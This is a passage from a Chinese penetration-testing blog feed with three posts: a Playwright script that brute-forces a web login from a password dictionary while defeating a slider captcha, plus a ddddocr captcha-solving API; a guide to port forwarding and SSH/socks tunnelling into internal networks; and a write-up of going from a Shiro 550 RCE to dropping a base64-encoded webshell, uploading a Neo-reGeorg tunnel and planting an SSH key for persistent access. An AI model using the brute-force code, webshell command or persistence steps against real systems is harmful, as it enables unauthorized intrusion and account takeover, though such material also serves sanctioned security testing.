<h4 id="修改为暴破脚本"><a href="#修改为暴破脚本" class="headerlink" title="修改为暴破脚本"></a>修改为暴破脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> Playwright, sync_playwright</span><br><span class="line"><span class="comment"># chrome的路径</span></span><br><span class="line">chromepath = <span class="string">r&quot;chromium-939194\chrome-win\chrome.exe&quot;</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readpasswd</span>(<span class="params">filename</span>):</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">r&quot;password.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> fp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">playwright: Playwright</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">    browser = playwright.chromium.launch(executable_path=chromepath, headless=<span class="literal">False</span>)</span><br><span class="line">    context = browser.new_context()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Open new page</span></span><br><span class="line">    page = context.new_page()</span><br><span class="line">    fp = readpasswd(<span class="number">1</span>)</span><br><span class="line">    username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    <span class="comment"># 循环读取字典暴破</span></span><br><span class="line">    <span class="keyword">for</span> passwd <span class="keyword">in</span> fp:</span><br><span class="line">        page.goto(<span class="string">&quot;http://xxx.xxx.xxx.xxx/login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Click input[name=&quot;userName&quot;]</span></span><br><span class="line">        page.click(<span class="string">&quot;input[name=\&quot;userName\&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Fill input[name=&quot;userName&quot;]</span></span><br><span class="line">        page.fill(<span class="string">&quot;input[name=\&quot;userName\&quot;]&quot;</span>, username)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Click input[name=&quot;password&quot;]</span></span><br><span class="line">        page.click(<span class="string">&quot;input[name=\&quot;password\&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Fill input[name=&quot;password&quot;]</span></span><br><span class="line">        page.fill(<span class="string">&quot;input[name=\&quot;password\&quot;]&quot;</span>, passwd)</span><br><span class="line">        <span class="comment"># Click text=/.*\&gt;\&gt;.*/</span></span><br><span class="line">        <span class="comment"># 滑动解锁代码</span></span><br><span class="line">        s = page.wait_for_selector(<span class="string">&quot;text=/.*\\&gt;\\&gt;.*/&quot;</span>)</span><br><span class="line">        box = s.bounding_box()</span><br><span class="line">        page.mouse.move(box[<span class="string">&quot;x&quot;</span>] + box[<span class="string">&quot;width&quot;</span>] / <span class="number">2</span>, box[<span class="string">&quot;y&quot;</span>] + box[<span class="string">&quot;height&quot;</span>] / <span class="number">2</span>)</span><br><span class="line">        page.mouse.down()</span><br><span class="line">        <span class="comment"># for i in range(10):</span></span><br><span class="line">        page.mouse.move(box[<span class="string">&quot;x&quot;</span>]+<span class="number">520</span>,box[<span class="string">&quot;width&quot;</span>]/<span class="number">2</span>, steps=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Click text=登录</span></span><br><span class="line">        page.mouse.up()</span><br><span class="line">        page.click(<span class="string">&quot;text=登录&quot;</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        response_html = page.content()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;username: <span class="subst">&#123;username&#125;</span>, password: <span class="subst">&#123;passwd&#125;</span>, length: <span class="subst">&#123;<span class="built_in">len</span>(response_html)&#125;</span>, title: <span class="subst">&#123;page.title()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------------------</span></span><br><span class="line">    context.close()</span><br><span class="line">    browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> playwright:</span><br><span class="line">    run(playwright)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行效果如下，通过页面长度、标题等输出信息可大致判断是否暴破成功：<br><img data-src="/2022/05/10/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4/2022-05-10-18-33-05.png"></p>
<h3 id="ddddocr：Python验证码识别库"><a href="#ddddocr：Python验证码识别库" class="headerlink" title="ddddocr：Python验证码识别库"></a>ddddocr：Python验证码识别库</h3><p>ddddocr是Python的一个OCR通用验证码识别SDK，可离线识别验证码。项目地址：<a href="https://github.com/sml2h3/ddddocr%E3%80%82">https://github.com/sml2h3/ddddocr。</a><br>为了方便使用这个验证码识别工具，我写了个简单的web api来方便远程调用验证码识别服务：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">### 保存以下代码为py文件，在服务器或者本地运行（需安装好ddddocr库）。</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, abort</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join, abspath, dirname</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">token = <span class="string">&#x27;fbc3a282fd5ed254e54d2260607a1360&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>  request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        usertoken = request.form.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        img = request.form.get(<span class="string">&#x27;b64img&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> token != usertoken:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;token error!&#x27;</span>, <span class="number">403</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                content = base64.b64decode(img.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                res = classfifyCode(content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">                res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classfifyCode</span>(<span class="params">image</span>):</span></span><br><span class="line">    ocr = ddddocr.DdddOcr()</span><br><span class="line">    res = ocr.classification(image)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">50000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>调用示例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取验证码图片</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://xxx.xxx.xxx/code.php&#x27;</span>)</span><br><span class="line">img = r.content</span><br><span class="line"></span><br><span class="line">b64img = base64.b64encode(img).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">token = <span class="string">&#x27;fbc3a282fd5ed254e54d2260607a1360&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">    <span class="string">&#x27;b64img&#x27;</span>: b64img</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证码识别服务器url</span></span><br><span class="line">r2 = requests.post(<span class="string">&#x27;http://127.0.0.1:50000&#x27;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r2.text, r.status_code)</span><br></pre></td></tr></table></figure>
<p>这里随便找了个图形验证码测试，能正常检测出来，而且速度非常快：<br><img data-src="/2022/05/10/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4/2022-05-10-18-55-39.png"></p>
<p>既然验证码识别的问题解决了，后面就是根据我们的实际需要去编写脚本或者集成到已有工具中了，非常简单。</p>
<p>下面补充一个burpsuite验证码识别插件<code>captcha-killer</code>调用该接口的案例：<br>captcha-killer：<a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">50000</span></span><br><span class="line">User-Agent: python-requests/<span class="number">2.26</span><span class="number">.0</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">2776</span></span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">token=fbc3a282fd5ed254e54d2260607a1360&amp;b64img=&lt;@URLENCODE&gt;&lt;@BASE64&gt;&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;&lt;/@BASE64&gt;&lt;/@URLENCODE&gt;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2022/05/10/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4/2022-05-10-19-07-32.png"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文介绍了浏览器自动化工具Playwright、验证码识别库ddddocr以及滑动验证码的暴破案例，如果遇到图形验证码的站点，只需要把滑动验证码的代码修改为调用ddddocr接口即可，相信聪明的读者们一定可以做到，就不重复赘述。</p>
<p>最后，感谢以下开源项目的作者为我们带来如此方便好用的工具：</p>
<p><a href="https://github.com/microsoft/playwright-python">https://github.com/microsoft/playwright-python</a></p>
<p><a href="https://github.com/sml2h3/ddddocr">https://github.com/sml2h3/ddddocr</a></p>
<p><a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈代理隧道的几种应用场景</title>
    <url>/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
    <content><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>熟练的代理转发，既可助你穿梭内网，亦可在工作生活中提供便利。理论上，任何接入互联网的计算机都是可访问的，但是如果目标主机处于内网，而我们又想和该目标主机进行通信的话，就需要借助一些端口转发工具来达到我们的目的。</p>
<h3 id="二、端口转发"><a href="#二、端口转发" class="headerlink" title="二、端口转发"></a>二、端口转发</h3><p>把端口接收到的流量转发到另外一个端口，可以是本机的端口，也可以是其它网络的端口。<br>实现原理：基于传输层协议，把socket字节流原封不动进行转发。<br>弊端：如果上层协议有校验，会出错。比如<code>HTTP协议</code>中部分WEB服务会校验host头，导致HTTP连接中断。</p>
<a id="more"></a>
<h4 id="2-1-简单端口转发"><a href="#2-1-简单端口转发" class="headerlink" title="2.1 简单端口转发"></a>2.1 简单端口转发</h4><p>域C可访问域B，不可访问域A。<code>172.16.1.1</code>把<code>172.16.2.1</code>的SSH服务<code>22</code>端口转发到自己的<code>8022</code>端口，<code>192.168.1.2</code>可通过访问<code>172.16.1.1:8022</code>端口连接<code>172.16.2.1</code>的SSH服务。<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-15-56-37.png"><br>实现方法：</p>
<ul>
<li>Windows：<code>netsh int portproxy</code>，如:<code>netsh interface portproxy add v4tov4 listenport=8022 connectport=22 connectaddress=172.16.2.1</code></li>
<li>Linux：<code>socat、iptables DNAT+SNAT</code>，如：<code>socat tcp-l:8022,reuseaddr,fork tcp:172.16.2.1:22,reuseaddr</code></li>
<li>lcx</li>
<li>ew</li>
<li>其它</li>
</ul>
<h4 id="2-2-反弹端口转发"><a href="#2-2-反弹端口转发" class="headerlink" title="2.2 反弹端口转发"></a>2.2 反弹端口转发</h4><p>局域网B内PC1无法直接访问局域网A内机器，把局域网A服务器172.16.2.1:22端口转发到公网服务器1.1.1.1:8022端口，这样可以让PC1通过公网访问该机器。<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-00-25.png"><br>实现方法：</p>
<ul>
<li>SSH远程转发</li>
<li>ngrok</li>
<li>nps</li>
<li>shootback</li>
</ul>
<h3 id="三、socks转发"><a href="#三、socks转发" class="headerlink" title="三、socks转发"></a>三、socks转发</h3><p>socks转发与端口转发类似，但是效果不同，端口转发效果只能访问单个端口的服务，socks转发可以访问整个目标网络。与VP*N效果类似，但是不能转发传输层以下的包。</p>
<h4 id="3-1-简单socks转发"><a href="#3-1-简单socks转发" class="headerlink" title="3.1 简单socks转发"></a>3.1 简单socks转发</h4><p><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-01-24.png"><br>实现方法：</p>
<ul>
<li>小飞机</li>
<li>ew</li>
<li>nps</li>
<li>reGeorg(webshell)</li>
<li>冰歇(webshell)<h4 id="3-2-反弹socks转发"><a href="#3-2-反弹socks转发" class="headerlink" title="3.2 反弹socks转发"></a>3.2 反弹socks转发</h4>socks服务器位于内网，外部机器通过公网访问反弹的socks端口来访问内网。<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-02-20.png"><br>实现方法：</li>
<li>小飞机+反弹端口</li>
<li>ew</li>
<li>nps</li>
<li>其它socks服务+反弹端口</li>
</ul>
<h3 id="四、SSH代理隧道"><a href="#四、SSH代理隧道" class="headerlink" title="四、SSH代理隧道"></a>四、SSH代理隧道</h3><h4 id="4-1-使用SSH动态端口转发"><a href="#4-1-使用SSH动态端口转发" class="headerlink" title="4.1 使用SSH动态端口转发"></a>4.1 使用SSH动态端口转发</h4><h5 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h5><p>使用工作PC访问公司内网服务器，登陆内网网站、登陆内网服务器。</p>
<h5 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接123.123.123.123:2222登陆到内网服务器A，其它内网端口未做映射<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-03-35.png"></p>
<h5 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
<li>工作机使用Xshell新建连接，并填好连接信息，然后打开隧道选项<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-10.png"></li>
<li>添加动态转发隧道<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-30.png"></li>
<li>这时候工作机使用浏览器设置<code>127.0.0.1:9999</code>为socks5代理，即可访问<code>172.16.1.101:80</code><br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-05-13.png"></li>
<li>如果要连接服务器B的3389端口，则需要借助<code>sockscap64</code>之类的工具打开，因为Windows远程连接客户端原生不支持代理，需要借助工具强制让它使用代理，这里不多赘述，可参考我的另一篇文章让<a href>BurpSuite使用MSF的socks4a代理</a>中<code>解决方法</code>-&gt;<code>步骤</code>-&gt;<code>1</code>中的sockscap64使用示例<h5 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h5>使用SSH动态端口转发，相当在远程SSH服务器启动了socks5代理服务，本地监听的<code>9999</code>端口流量将通过SSH隧道转发到SSH服务器，SSH服务器再对外发起网络请求。以上转发亦可使用<code>ssh</code>命令或者其它SSH客户端实现，具体方法可自行实验。<h5 id="出口数据流向"><a href="#出口数据流向" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-0" class="flow-chart"></div>




</li>
</ol>
<h4 id="4-2-使用SSH隧道本地转发"><a href="#4-2-使用SSH隧道本地转发" class="headerlink" title="4.2 使用SSH隧道本地转发"></a>4.2 使用SSH隧道本地转发</h4><h5 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h5><p>工作PC连接Windows服务器B的远程桌面。</p>
<h5 id="网络拓扑-1"><a href="#网络拓扑-1" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接<code>123.123.123.123:2222</code>登陆到内网服务器A，其它内网端口未做映射<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-08-50.png"></p>
<h5 id="操作步骤-1"><a href="#操作步骤-1" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
<li>工作机<code>xshell</code>创建连接后，在<code>属性</code>-&gt;<code>连接</code>-&gt;<code>隧道</code>中添加<code>Local</code>类型转发<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-15-41.png"></li>
<li>这时工作机打开远程桌面客户端，通过连接<code>127.0.0.1:9999</code>端口，可连接到内网服务器B的<code>3389</code>端口<br><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-16-14.png"><h5 id="原理解释-1"><a href="#原理解释-1" class="headerlink" title="原理解释"></a>原理解释</h5>SSH隧道的本地转发，相当于把本地监听的<code>9999</code>端口接收到的TCP流量，通过SSH隧道转发到远程的SSH服务器A，服务器A再发起TCP连接到服务器B的3389端口。可以看到，本地转发跟动态转发有点相似，不同的是本地转发是转发了<code>一个远程端口</code>到本地，而动态转发可通过配置代理访问整个<code>远程网络</code>。<br>注意：这种方法转发<code>HTTP</code>端口一般无法成功，因为HTTP协议带有<code>Host</code>头，服务器端校验Host头后可能会重置该HTTP请求导致无法连接，如果想了解这一细节，不妨抓个包看看。</li>
</ol>
<h5 id="出口数据流向-1"><a href="#出口数据流向-1" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-1" class="flow-chart"></div>

<h4 id="4-3-使用SSH隧道远程转发"><a href="#4-3-使用SSH隧道远程转发" class="headerlink" title="4.3 使用SSH隧道远程转发"></a>4.3 使用SSH隧道远程转发</h4><h5 id="需求-2"><a href="#需求-2" class="headerlink" title="需求"></a>需求</h5><p>工作PC-B访问工作PC-A上面的MySQL数据库（3306端口）。</p>
<h5 id="网络拓扑-2"><a href="#网络拓扑-2" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-18-53.png"></p>
<h5 id="操作步骤-2"><a href="#操作步骤-2" class="headerlink" title="操作步骤"></a>操作步骤</h5><p><img data-src="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-19-09.png"></p>
<h5 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h5><p>远程转发的功能刚好与本地转发相反，可以把本地监听的端口转发到远程服务器上，可用于办公区的机器需要访问工作机的本地端口时候使用，比如工作机上面配置了数据库服务，监听本地3306端口，通过转发本地<code>3306</code>端口到远程服务器A的<code>9999</code>端口上，服务器B可访问工作机的数据库应用。</p>
<p>注意：远程转发默认只能转发到SSH服务器的环回网卡（127.0.0.1），外部网络访问（如本例）需要启动<code>GatewayPorts</code>配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 编辑sshd 的配置文件&#x2F;etc&#x2F;ssh&#x2F;sshd_config，将GatewayPorts 开关打开：</span><br><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure>

<h5 id="出口数据流向-2"><a href="#出口数据流向-2" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-2" class="flow-chart"></div>

<h3 id="五、代理链工具"><a href="#五、代理链工具" class="headerlink" title="五、代理链工具"></a>五、代理链工具</h3><p>强制程序使用代理，让一些不支持代理的工具也能使用socks代理</p>
<ul>
<li>proxychains</li>
<li>sockscap64</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/articles/web/170970.html">内网渗透之端口转发与代理工具总结</a><br><a href="https://xz.aliyun.com/t/142">内网端口转发及穿透</a><br><a href="https://ryaninf.github.io/2019/07/11/%E8%AE%A9BURP%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/">让BurpSuite使用MSF的socks4a代理</a><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 工作机Firefox
e=>end: 内网服务器B（172.16.1.101:80)
op1=>operation: SSH动态转发本地监听端口（127.0.0.1:9999)
op2=>operation: SSH隧道连接服务器A（172.16.1.100:22)
st->op1->op2->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script><textarea id="flowchart-1-code" style="display: none">st=>start: 工作机RDP客户端
e=>end: 内网服务器B（172.16.1.101:3389)
op1=>operation: SSH动态转发本地监听端口（127.0.0.1:9999)
op2=>operation: SSH隧道连接服务器A（172.16.1.100:22)
st->op1->op2->e</textarea><textarea id="flowchart-1-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-1-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-1-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-1", options);</script><textarea id="flowchart-2-code" style="display: none">st=>start: 工作PC-B Mysql客户端
e=>end: 工作PC-A（192.168.1.100:3306)
op1=>operation: 云服务器监听端口（123.123.123.123:9999)
op2=>operation: 工作PC-A SSH客户端进程
st->op1->op2->e</textarea><textarea id="flowchart-2-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-2-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-2-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-2", options);</script></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试从RCE到SSH登录</title>
    <url>/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在渗透测试中，拿到webshell后执行命令总会碰到很多不便，而使用ssh登录则会方便许多。相比使用webshell工具执行命令，ssh连接可以有命令提示、路径补全、支持二次交互等优势，本文记录一个从WEB RCE漏洞到SSH登录的姿势。</p>
<a id="more"></a>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>首先通过Shiro 550得到一个shell<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-10-46-08.png"></p>
<p>因为网站不出网，所以不能直接反弹shell，通过base64写入webshell到web目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> &lt;base64 webshell&gt; |base64 -d &gt; webapps/uploadImg/shell.jsp;ls -lah</span><br></pre></td></tr></table></figure>
<h4 id="架设代理"><a href="#架设代理" class="headerlink" title="架设代理"></a>架设代理</h4><p>网站不出网，所以需要架设socks代理访问ssh端口及内网主机，这里使用Neo-reGeorg。首次使用，先生成自己密码的neoreg服务端代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 neoreg.py generate -k &lt;your-password&gt;</span><br></pre></td></tr></table></figure>
<p>执行后在<code>neoreg_servers</code>找到对应服务端语言的文件，这里是<code>tunnel.jsp</code>，然后通过上面的shell上传到目标服务器web目录上，再通过neoreg连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -k 指定连接密码，就是生成时用的密码</span></span><br><span class="line"><span class="comment"># -u tunnel.jsp 的url</span></span><br><span class="line"><span class="comment"># --skip 忽略https证书错误</span></span><br><span class="line"><span class="comment"># -l 本地socks服务监听ip</span></span><br><span class="line"><span class="comment"># -p 本地socks服务监听端口</span></span><br><span class="line">python3 neoreg.py -k &lt;your-password&gt; -u https://xxx.com/uploadImg/tunnel.jsp --skip -l 0.0.0.0 -p 30080</span><br></pre></td></tr></table></figure>

<h4 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h4><p>为了尽量少修改服务器配置，通过写入ssh公钥可以不修改密码或者破解密码的情况下连接上ssh。这里使用xshell生成秘钥对，默认选项生成就可以了，shell会自动保存秘钥对，当然使用ssh-keygen也是可以的<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-03-18.png"></p>
<p>然后把生成的公钥文件，复制到目标主机的<code>~/.ssh/authorized_keys</code>文件中，如果不存在可以创建<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-06-41.png"></p>
